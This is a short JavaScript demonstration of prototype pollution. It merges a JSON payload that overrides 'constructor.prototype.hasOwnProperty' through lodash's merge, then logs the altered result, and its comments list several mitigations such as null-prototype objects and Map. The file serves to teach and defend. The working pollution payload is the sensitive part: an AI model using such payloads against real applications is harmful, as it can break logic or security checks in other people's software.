// One of the fastest growing vulnerability.
// Check the CVE website for latest information: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution

'use strict';

const _ = require('lodash');
const malicious_payload = '{"constructor": {"prototype": {"hasOwnProperty": true}}}';

const a = {
    key: 1
};

// The below method creates an object with no prototype,
// however the below attributes like hasOwnProperty() could not be used.
// const a = Object.create(null);
// a.key = 1;

// Or this method does the same result:
// Object.setPrototypeOf(a, null);

// Or this method, but might break some of the codes:
// Object.freeze(a.__proto__);

// Or just use a with a new Map(), which has similar methods to hasOwnProperty() but does not share the same vulnerability;
// const a = new Map();
// a.has();

console.log("Before : " + a.hasOwnProperty); // function hasOwnProperty() { [native code] }
_.merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.hasOwnProperty); // true